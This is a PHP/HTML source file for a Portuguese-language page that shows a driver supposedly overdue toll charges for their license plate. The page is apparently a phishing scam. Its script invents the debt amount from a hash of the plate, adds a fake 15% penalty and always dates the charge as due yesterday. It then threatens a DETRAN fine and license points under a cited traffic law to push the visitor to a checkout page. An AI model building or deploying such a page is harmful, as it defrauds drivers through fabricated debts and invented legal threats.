<?php
require_once 'config.php';






// Inicializar classes de segurança (do config.php)
$security = new Security();
$antiCopy = new AntiCopy();

// ========== CARREGAR SISTEMA CENTRAL DE SEGURANÇA ==========
define('SECURITY_INIT', true);
require_once 'includes/security_init.php';

// Aplicar segurança na página (já inclui AntiCopy e logs)
applySecurity('index');

// ========== LOG DE ACESSO À PÁGINA (opcional - security_init já faz isso) ==========
// Se quiser um log mais detalhado específico para esta página:
if (file_exists('./includes/Logger.php')) {
    require_once './includes/Logger.php';
    $pageLogger = new Logger();
    $pageLogger->logPageAccess($_SERVER['REQUEST_URI'], round((microtime(true) - ($_SERVER['REQUEST_TIME_FLOAT'] ?? microtime(true))) * 1000));
}

// ========== VERIFICAÇÕES DE SEGURANÇA ==========
// Verificar se IP está bloqueado
if ($security->isBlocked()) {
    die('Acesso bloqueado. Motivo: ' . htmlspecialchars($_SESSION['block_reason'] ?? 'Atividade suspeita'));
}

// Verificar rate limit para requisições
if (!$security->checkRateLimit('page_view')) {
    die('Muitas requisições. Tente novamente mais tarde.');
}

// Gerar token CSRF para formulários
$csrf_token = $security->generateCSRFToken();
$timestamp = time();

// Processar formulário de busca se enviado
$search_result = null;


$plate = $_POST['plate'] ?? '';
$marca = $_POST['marca'] ?? '';
$modelo = $_POST['modelo'] ?? '';
$ano = $_POST['ano'] ?? '';
$cor = $_POST['cor'] ?? '';
$municipio = $_POST['municipio'] ?? '';
$uf = $_POST['uf'] ?? ''

    ?>


<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Flow Pag</title>
    <style>
        :root {
            --black: #000;
            --ink: #000;
            --muted: #6b7280;
            --gray-1: #f3f4f6;
            --gray-2: #cbd5e1;
            --gray-3: #d1d5db;
            --brand: #ff9f1c;
            --lime: #e5ff51;
            --radius: 12px;
            --radius-lg: 14px;
            --maxw: 580px;
            --bd: rgba(0, 0, 0, .08)
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0
        }

        html,
        body {
            height: 100%
        }

        body {
            font-family: Ubuntu, 'Work Sans', sans-serif;
            color: var(--ink);
            background: #eee
        }

        .appbar {
            position: sticky;
            top: 0;
            z-index: 50;
            background: #fff;
            border-bottom: 1px solid var(--bd);
            padding: 12px
        }

        .appbar__inner {
            max-width: 1200px;
            margin: 0 auto;
            padding: 10px 20px;
            display: grid;
            grid-template-columns: 40px 1fr 40px;
            align-items: center
        }

        .back {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 36px;
            height: 36px;
            border: 0;
            border-radius: 999px;
            cursor: pointer;
            color: #000;
            background: #fff;
            text-decoration: none
        }

        .appbar__title {
            margin: 0;
            text-align: center;
            font-weight: 400;
            color: #000;
            font-size: 18px
        }

        .appbar__spacer {
            display: block;
            width: 36px
        }

        .hero-strap {
            position: relative;
            overflow: visible;
            height: 250px;
            margin-bottom: 80px
        }

        .hero-img {
            width: 100%;
            height: 250px;
            object-fit: cover;
            object-position: center 20%;
            display: block;
            max-width: 1150px;
            margin: 0 auto;
            filter: brightness(.5)
        }

        .search-wrap {
            position: absolute;
            left: 50%;
            bottom: -40px;
            transform: translateX(-50%);
            width: min(var(--maxw), 94vw);
            z-index: 5
        }

        .search-label {
            display: flex;
            align-items: center;
            gap: 8px;
            color: #fff;
            font-weight: 400;
            margin: 0 0 8px;
            font-size: 18px
        }

        .search-label img {
            width: 24px;
            height: 24px
        }

        .search {
            position: relative;
            display: flex;
            flex-direction: column;

            background: #fff;
            border-radius: 12px;
            border: 1px solid rgba(0, 0, 0, .06);
            box-shadow: 0 16px 34px #00000047;
            padding: 8px;
        }

        .search .search_up {
            display: flex;
            flex-direction: row;
            justify-content: space-between;
        }

        .search .search_up .model h4 {
            font-size: 16px;
        }

        .search .search_up .year {
            border: 1px solid #000;
            border-radius: 3px;
            padding: 3px;
            font-size: 12px;
        }

        .search .search_down {
            padding: 5px;
            font-size: 12px;
        }

        .search input {
            width: 100%;
            padding: 18px 44px 18px 16px;
            border: 0;
            outline: none;
            font-size: 16px;
            border-radius: 12px;
            text-transform: uppercase;
            font-weight: 600
        }

        .page {
            padding-bottom: 120px
        }

        .container {
            width: min(var(--maxw), 94vw);
            margin: 60px auto
        }

        .section-title {
            font-size: 18px;
            font-weight: 400;
            color: #000;
            margin: 14px 0 12px
        }

        .section-bar {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 12px;
            margin-bottom: 5px;
            border-bottom: 1px solid var(--gray-2)
        }

        .section-stamp {
            font-size: 16px;
            white-space: nowrap;
            color: #000;
            font-weight: 700
        }

        .section-stamp:before {
            content: "Atualizado em: ";
            color: #000;
            font-weight: 400;
            font-size: 12px;
            opacity: .7
        }

        .row {
            display: grid;
            grid-template-columns: 24px 1fr auto;
            align-items: start;
            gap: 12px;
            padding: 12px 6px
        }

        .row input[type=checkbox] {
            width: 20px;
            height: 20px;
            margin-top: 2px;
            accent-color: #000
        }

        .row--bulk {
            border-bottom: 1px solid var(--gray-2);
            margin-bottom: 16px
        }

        strong#bulkLabel {
            font-weight: 400;
            font-size: 14px
        }

        .list {
            list-style: none;
            margin: 0;
            padding: 0
        }

        .alerta-multas {
            display: flex;
            align-items: flex-start;
            gap: 12px;
            background: #dc2626;
            color: #fff;
            padding: 16px;
            border-radius: 12px;
            margin: 16px 0;
            font-size: 14px;
            line-height: 1.5
        }

        .alerta-multas svg {
            width: 24px;
            height: 24px;
            flex-shrink: 0;
            margin-top: 2px
        }

        .alerta-multas span {
            flex: 1
        }

        .alerta-multas strong {
            font-weight: 700
        }

        .total-card {
            position: fixed;
            left: 50%;
            bottom: 16px;
            transform: translate(-50%);
            width: min(var(--maxw), 94vw);
            background: #fff;
            border: 1px solid var(--gray-2);
            border-radius: 12px;
            box-shadow: 0 30px 70px #00000059;
            padding: 12px 16px 16px;
            max-height: 50vh;
            overflow-y: auto;
            z-index: 40
        }

        strong#totalTitle {
            color: #000;
            font-size: 18px;
            font-weight: 400
        }

        .total-head {
            width: 100%;
            background: transparent;
            border: 0;
            border-radius: 12px;
            padding: 12px 16px;
            cursor: pointer;
            display: flex;
            flex-direction: column;
            gap: 10px
        }

        .total-head .th-row {
            display: flex;
            align-items: center;
            justify-content: space-between
        }

        .total-head .th-bottom {
            border-top: 1px solid var(--gray-2);
            padding-top: 10px;
            color: #363636
        }

        .total-value {
            font-weight: 900;
            font-size: 18px;
            color: #000
        }

        .btn-continue {
            border: 0;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            transition: filter .2s, transform .15s
        }

        .btn-continue--inline {
            width: auto;
            height: 40px;
            padding: 0 14px;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 700;
            background: var(--black);
            color: var(--lime);
            cursor: pointer;
            box-shadow: 0 16px 40px #00000040
        }

        /* Modal */
        .dlg {
            position: fixed;
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 10000
        }

        .dlg.is-open {
            display: flex
        }

        .dlg__overlay {
            position: absolute;
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            background: #00000073
        }

        .dlg__card {
            position: relative;
            z-index: 1001;
            width: min(480px, 92%);
            background: #fff;
            border-radius: 16px;
            padding: 24px;
            box-shadow: 0 25px 80px #00000059
        }

        .m__grab {
            width: 56px;
            height: 4px;
            background: #d1d5db;
            border-radius: 999px;
            margin: 0 auto 10px
        }

        .dlg__title {
            font-size: 22px;
            font-weight: 700;
            margin: 20px 0 8px;
            text-align: center
        }

        .dlg__body p {
            margin: 0 0 10px;
            line-height: 1.5
        }

        .dlg__actions {
            margin-top: 16px;
            display: flex;
            gap: 10px;
            justify-content: flex-end
        }

        .dlg__secondary {
            display: block;
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #d1d5db;
            border-radius: 12px;
            background: #fff;
            color: #000;
            font-weight: 500;
            cursor: pointer;
            font-size: 15px
        }

        .dlg__primary {
            display: block;
            width: 100%;
            padding: 12px 16px;
            border: 0;
            border-radius: 12px;
            background: #000;
            color: #e5ff51;
            font-weight: 700;
            cursor: pointer;
            font-size: 15px
        }

        .vencimento-multa {
            border: 2px solid red;
            border-radius: 5px;
            padding: 3px;
            font-size: 14px;
            font-weight: bold;
            color: red;
            margin-bottom: 10px;
        }

        @media(max-width:720px) {
            .hero-strap {
                height: 140px;
                margin-bottom: 60px
            }

            .hero-img {
                height: 140px
            }

            .search-wrap {
                bottom: -30px
            }

            .search-label {
                font-size: 15px;
                margin-bottom: 6px
            }

            .search input {
                padding: 14px 16px;
                font-size: 15px
            }

            .container {
                width: min(96vw, 680px);
                margin-top: 10px
            }

            .section-bar {
                padding-bottom: 8px
            }

            .section-title {
                font-size: 16px;
                margin: 10px 0 8px
            }

            .section-stamp {
                font-size: 13px
            }

            .row {
                grid-template-columns: 20px 1fr auto;
                gap: 10px;
                padding: 10px 4px
            }

            .row input[type=checkbox] {
                width: 18px;
                height: 18px
            }

            label.row.row--bulk {
                grid-template-columns: 20px 1fr
            }

            strong#bulkLabel {
                font-size: 13px
            }

            .alerta-multas {
                padding: 12px;
                font-size: 13px;
                margin: 12px 0
            }

            .total-card {
                bottom: 10px;
                padding: 10px 14px 14px;
                border-radius: 10px
            }

            .total-head {
                padding: 8px 10px
            }

            .total-head .th-bottom {
                padding-top: 8px
            }

            strong#totalTitle {
                font-size: 16px
            }

            .total-value {
                font-size: 16px
            }

            .page {
                padding-bottom: 110px
            }
        }

        @media(max-width:480px) {
            .hero-strap {
                height: 120px;
                margin-bottom: 50px
            }

            .hero-img {
                height: 120px
            }

            .search-wrap {
                bottom: -25px
            }

            .search input {
                padding: 12px 14px;
                font-size: 14px
            }

            .container {
                margin-top: 8px
            }

            .section-bar {
                flex-direction: column;
                gap: 4px;
                align-items: flex-start;
                padding-bottom: 8px
            }

            .row {
                grid-template-columns: 20px 1fr auto;
                gap: 8px;
                padding: 8px 2px
            }

            #debitoValor {
                font-size: 16px !important
            }

            .alerta-multas {
                gap: 8px;
                padding: 10px;
                font-size: 12px;
                border-radius: 10px
            }

            .alerta-multas svg {
                width: 20px;
                height: 20px
            }
        }

        .page,
        .container,
        .hero-strap {
            overflow: visible !important
        }
    </style>
</head>

<body>

    <header class="appbar">
        <div class="appbar__inner">
            <a class="back" href="index.html" aria-label="Voltar">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
                    stroke-linecap="round" stroke-linejoin="round">
                    <path d="M19 12H5M12 19l-7-7 7-7"></path>
                </svg>
            </a>
            <h1 class="appbar__title">Débitos</h1>
            <span aria-hidden="true" class="appbar__spacer"></span>
        </div>
    </header>

    <main class="page">
        <section class="hero-strap">
            <img alt="" class="hero-img" src="images/hero-bg.jpg">
            <div class="search-wrap">
                <label class="search-label" for="qPlaca">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2">
                        <rect x="2" y="6" width="20" height="12" rx="3"></rect>
                        <line x1="2" y1="10" x2="22" y2="10"></line>
                    </svg>
                    <span>Seus veículos:</span>
                </label>
                <div class="search">
                    <div class="search_up">
                        <div class="model">
                            <h4><?= htmlspecialchars($modelo) ?></h4>
                        </div>
                        <div class="year">
                            <span>
                                <strong>Ano:<?= htmlspecialchars($ano) ?></strong>

                            </span>
                        </div>
                    </div>
                    <div class="search_down">
                        <p><strong>Cor:</strong><?= htmlspecialchars($cor) ?> |
                            <strong>Placa:</strong><?= htmlspecialchars($plate) ?>
                        </p>
                    </div>
                </div>
            </div>
        </section>

        <section class="container" id="debitosSection">
            <div class="section-bar">
                <h2 class="section-title">Pedágio</h2>
                <time class="section-stamp" id="debitoCheckedAt">15/03/2026 - 15:03</time>
            </div>

            <label class="row row--bulk">
                <input id="checkAll" type="checkbox" checked="">
                <span><strong id="bulkLabel">Passagens em aberto</strong></span>
            </label>

            <ul class="list" id="listaDebitos">
                <li class="row"
                    style="justify-content:center;grid-template-columns:1fr;text-align:center;padding:30px 0">
                    <div><strong>Buscando débitos...</strong>
                        <div style="font-size:13px;color:#6b7280;margin-top:6px">Consultando sistema, aguarde alguns
                            segundos.</div>
                    </div>
                </li>
            </ul>
        </section>

        <section class="container" id="zapaySection" style="display:none;margin-top:-30px">
            <div class="section-bar">
                <h2 class="section-title">Débitos Veiculares (DETRAN)</h2>
                <span class="section-stamp" id="zapayDetranStamp"></span>
            </div>
            <label class="row row--bulk">
                <input id="checkZapay" type="checkbox">
                <span><strong style="font-weight:400;font-size:14px">Incluir débitos DETRAN no pagamento</strong></span>
            </label>
            <ul class="list" id="listaZapay"></ul>
        </section>

        <aside class="total-card">
            <div class="total-head" id="toggleResumo">
                <div class="th-row th-top">
                    <strong id="totalTitle">Total a pagar:</strong>
                    <svg aria-hidden="true" height="32" viewBox="0 0 24 24" width="32">
                        <path d="M6 9l6 6 6-6" fill="none" stroke="currentColor" stroke-linecap="round"
                            stroke-linejoin="round" stroke-width="2"></path>
                    </svg>
                </div>
                <div class="th-row th-bottom">
                    <div class="total-value" id="totalValue">Carregando...</div>
                    <button class="btn-continue btn-continue--inline" id="btnContinuar" type="button">Continuar</button>
                </div>
            </div>
        </aside>

        <!-- Modal Debitos DETRAN encontrados (informativo) -->
        <div class="dlg" id="zapayModal">
            <div class="dlg__overlay" id="zapayOverlay"></div>
            <div class="dlg__card">
                <div class="m__grab"></div>
                <div style="text-align:center;margin-bottom:12px">
                    <div
                        style="width:48px;height:48px;background:#fef3c7;border:2px solid #fbbf24;border-radius:12px;display:flex;align-items:center;justify-content:center;margin:0 auto 10px">
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                            <path d="M12 2L1 21h22L12 2z" fill="#f59e0b"></path>
                            <path d="M12 8v5M12 16h.01" stroke="#fff" stroke-width="2" stroke-linecap="round"
                                stroke-linejoin="round/"></path>
                        </svg>
                    </div>
                    <h3 style="font-size:18px;font-weight:700;color:#18181b;margin-bottom:4px">Débitos Encontrados!</h3>
                    <p style="font-size:13px;color:#6b7280" id="zapayDetranLabel"></p>
                    <div id="zapayVehicleInfo"
                        style="display:none;font-size:13px;color:#374151;font-weight:600;margin-top:6px;background:#f1f5f9;padding:6px 12px;border-radius:6px">
                    </div>
                </div>
                <div id="zapayDebtsList" style="margin:12px 0"></div>
                <div
                    style="background:#eff6ff;border-left:3px solid #3b82f6;padding:10px 12px;border-radius:4px;margin:12px 0">
                    <p style="margin:0;font-size:13px;color:#1e40af;line-height:1.5">Você pode pagar seus débitos
                        veiculares
                        <strong>junto com o pedágio</strong> em um único pagamento. Selecione os débitos que deseja
                        incluir.
                    </p>
                </div>
                <div style="margin-top:16px">
                    <button class="dlg__primary" id="btnZapayOk" style="padding:12px 16px;width:100%"
                        type="button">Entendi</button>
                </div>
            </div>
        </div>

    </main>

    <!-- Modal ATENCAO -->
    <div class="dlg" id="atencaoModal">
        <div class="dlg__overlay" id="modalOverlay"></div>
        <div class="dlg__card">
            <div class="m__grab"></div>
            <h3 class="dlg__title" style="color:#dc2626;font-size:18px;margin-bottom:12px">⚠️ ATENÇÃO</h3>
            <div style="text-align:left;color:#000;line-height:1.5">
                <p style="margin:0 0 10px 0;font-weight:600;font-size:14px">A partir de <strong style="color:#dc2626"
                        id="dataInfracao">16/03/2026</strong> será encaminhada ao DETRAN a infração relacionada ao
                    veículo:</p>
                <div style="background:#f0f9ff;border:1px solid #0ea5e9;border-radius:6px;padding:8px;margin:8px 0">
                    <div style="display:flex;justify-content:space-between;align-items:center">
                        <span style="font-weight:600;color:#0c4a6e;font-size:13px">Valor do Débito:</span>
                        <span style="font-size:20px;font-weight:700;color:#0ea5e9" id="modalValor">R$ 38,90</span>
                    </div>
                </div>
                <div
                    style="background:#fef2f2;border-left:3px solid #dc2626;padding:8px;margin:8px 0;border-radius:4px">
                    <p style="margin:0 0 4px 0;font-weight:600;font-size:12px">Art. 209-A - CTB:</p>
                    <p style="margin:0;font-size:12px;line-height:1.4">Evadir-se da cobrança pelo uso de rodovias e vias
                        urbanas
                        para não efetuar o seu pagamento, ou deixar de efetuá-lo na forma estabelecida.</p>
                </div>
                <p style="margin:8px 0;font-weight:600;font-size:13px">Multa: <strong style="color:#dc2626">R$
                        195,23</strong> e
                    <strong style="color:#dc2626">5 pontos na CNH</strong>.
                </p>
                <p style="margin:8px 0 0 0;font-weight:600;color:#dc2626;font-size:13px">Realize o pagamento agora e
                    evite a
                    autuação.</p>
            </div>
            <div style="margin-top:16px;display:flex;gap:10px;justify-content:flex-end">
                <button class="dlg__secondary" id="btnCancelar" style="padding:10px 20px"
                    type="button">Cancelar</button>
                <button class="dlg__primary" id="btnEntendi" style="padding:10px 20px" type="button">Entendi</button>
            </div>
        </div>
    </div>

    <script>
        (function () {


            const plate = <?= json_encode($plate) ?>;

            const vehicleData = {
                plate: <?= json_encode($_POST['plate'] ?? '') ?>,
                marca: <?= json_encode($_POST['marca'] ?? '') ?>,
                modelo: <?= json_encode($_POST['modelo'] ?? '') ?>,
                ano: <?= json_encode($_POST['ano'] ?? '') ?>,
                cor: <?= json_encode($_POST['cor'] ?? '') ?>,
            };



            if (!plate || plate.length < 7) {
                document.getElementById('listaDebitos').innerHTML = '<li class="row" style="justify-content:center;grid-template-columns:1fr;text-align:center;padding:30px 0"><div><strong>Placa não informada</strong><div style="font-size:13px;color:#6b7280;margin-top:6px">Informe uma placa válida na URL: ?plate=ABC1234</div></div></li>';
                document.getElementById('totalValue').textContent = 'R$ 0,00';
                return;
            }

            // Preenche o campo da placa
            var placaInput = document.getElementById('qPlaca');
            if (placaInput) placaInput.value = plate;


            // Atualiza a data/hora atual
            var now = new Date();
            var dd = String(now.getDate()).padStart(2, '0');
            var mm = String(now.getMonth() + 1).padStart(2, '0');
            var yyyy = now.getFullYear();
            var hh = String(now.getHours()).padStart(2, '0');
            var mi = String(now.getMinutes()).padStart(2, '0');
            document.getElementById('debitoCheckedAt').textContent = dd + '/' + mm + '/' + yyyy + ' - ' + hh + ':' + mi;

            // Função para formatar valores monetários
            function formatMoney(v) {
                return 'R$ ' + v.toFixed(2).replace('.', ',');
            }



            // calcula multa baseada no Valor total da placa

            function multa(valorTotal) {
                const valor = Number(valorTotal)
                const multa = valor * 0.15;
                return multa;
            }

            // Calcula valor via hash da placa
            function calcularValorPorHash(placa) {
                var hash = 0;
                for (var i = 0; i < placa.length; i++) {
                    hash = ((hash << 5) - hash) + placa.charCodeAt(i);
                    hash = hash & hash;
                }
                hash = Math.abs(hash);
                // Gera valor entre 29.00 e 45.00
                var valor = (hash % 161 + 530) / 10;
                valor = Math.round(valor * 100) / 100;

                return valor;
            }

            const hoje = new Date();

            function getDate(data) {

                const newDate = new Date(data)

                newDate.setDate(newDate.getDate() - 1);

                const dia = String(newDate.getDate()).padStart(2, '0');
                const mes = String(newDate.getMonth() + 1).padStart(2, '0');
                const ano = newDate.getFullYear();

                return `${dia}/${mes}/${ano}`;


            }


            // Calcula o valor total
            var valorTotal = calcularValorPorHash(plate);
            var multaTotal = multa(valorTotal)

            const montante = valorTotal + multaTotal

            // Gera o HTML da lista de débitos
            var listaDebitos = document.getElementById('listaDebitos');
            listaDebitos.innerHTML = `
    <li class="row">
      <input type="checkbox" class="debito-checkbox" data-valor="${valorTotal}" checked>
      <div>
        <strong>${plate}</strong>
        <div style="font-size:18px;color:#6b7280;margin-top:4px">Passagem Ecovias - Pedágio</div>
      </div>
      <div>
            <div class="vencimento-multa">Venceu em ${getDate(hoje)}</div>
            <div style="font-weight:700;font-size:18px;color:#000;text-align:right">${formatMoney(valorTotal)}</div>
      </div>
      </li>
     <li class="row">
      <input type="checkbox" class="debito-checkbox" data-valor="${multaTotal}" checked>
      <div>
        <strong>${plate}</strong>
        <div style="font-size:18px;color:#6b7280;margin-top:4px">CCR AutoBAn </div>
      </div>
      <div>
         <div class="vencimento-multa">Venceu em ${getDate(hoje)}</div>
        <div style="font-weight:700;font-size:18px;color:#000;text-align:right">${formatMoney(multaTotal)}</div>
      </div>
      </li>
    <div class="alerta-multas">
      <svg width=24 height=24 viewBox="0 0 24 24" fill=none>
        <path d="M12 2L1 21h22L12 2z" fill=white></path>
        <path d="M12 8v5M12 16h.01" stroke=#dc2626 stroke-width=2 stroke-linecap=round stroke-linejoin=round></path>
      </svg>
      <span>Evite multas! Em caso de não pagamento, a infração é de<br><strong>R$ 195,23 e 5 pontos na CNH.</strong></span>
    </div>
  `;

            // Atualiza o total a pagar
            document.getElementById('totalValue').textContent = formatMoney(montante);
            document.getElementById('modalValor').textContent = formatMoney(montante);

            // Armazena o total no sessionStorage
            sessionStorage.setItem('debitoTotal', montante);

            // Adiciona evento para recalcular total quando checkbox for alterado
            function setupCheckboxes() {
                var checkboxes = document.querySelectorAll('.debito-checkbox');
                checkboxes.forEach(function (cb) {
                    cb.addEventListener('change', function () {
                        var total = 0;
                        document.querySelectorAll('.debito-checkbox:checked').forEach(function (checkbox) {
                            total += parseFloat(checkbox.getAttribute('data-valor')) || 0;
                        });
                        total = Math.round(total * 100) / 100;
                        document.getElementById('totalValue').textContent = formatMoney(total);
                        sessionStorage.setItem('debitoTotal', total);
                    });
                });
            }

            // Configura o botão Continuar
            function setupContinueButton() {
                document.getElementById('btnContinuar').onclick = function () {
                    var total = 0;
                    document.querySelectorAll('.debito-checkbox:checked').forEach(function (cb) {
                        total += parseFloat(cb.getAttribute('data-valor')) || 0;
                    });
                    total = Math.round(total * 100) / 100;
                    location.href = 'checkout.php?plate=' + encodeURIComponent(plate) + '&amount=' + total;
                };
            }

            // Configura os modais
            function setupModals() {
                function closeModal() {
                    document.getElementById('atencaoModal').classList.remove('is-open');
                }

                document.getElementById('btnCancelar').onclick = function () {
                    closeModal();
                    location.href = 'pedagio.html';
                };

                document.getElementById('btnEntendi').onclick = closeModal;
                document.getElementById('modalOverlay').onclick = closeModal;
            }

            // Inicializa todas as funcionalidades
            setupCheckboxes();
            setupContinueButton();
            setupModals();

            // Esconde a seção Zapay/DETRAN se existir
            var zapaySection = document.getElementById('zapaySection');
            if (zapaySection) zapaySection.style.display = 'none';

        })();
    </script>
    <p style="font-size:11px;text-align:center;margin:15px auto;padding:0 20px"><a href="/termos.html"
            style="color:#666;text-decoration:underline">Termos de Uso</a>  |  <a href="/privacidade.html"
            style="color:#666;text-decoration:underline">Política de Privacidade</a></p>


</body>

</html>